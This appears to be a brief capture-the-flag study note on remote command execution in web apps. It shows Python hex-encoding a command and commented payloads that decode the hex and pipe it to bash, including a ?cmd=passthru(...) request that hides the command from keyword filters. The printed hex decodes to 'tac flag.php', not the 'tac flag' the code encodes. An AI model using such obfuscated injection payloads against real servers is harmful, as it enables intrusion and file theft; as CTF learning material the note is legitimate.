# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/命令执行.md
# TITLE: 什么是rce
# CATEGORY: web

import binascii
s = b"tac flag"
h = binascii.b2a_hex(s)
print(h)
# echo "74616320666c61672e706870" |xxd -r -p|bash
# ?cmd=passthru('echo "74616320666c61672e706870"|xxd -r -p|bash');
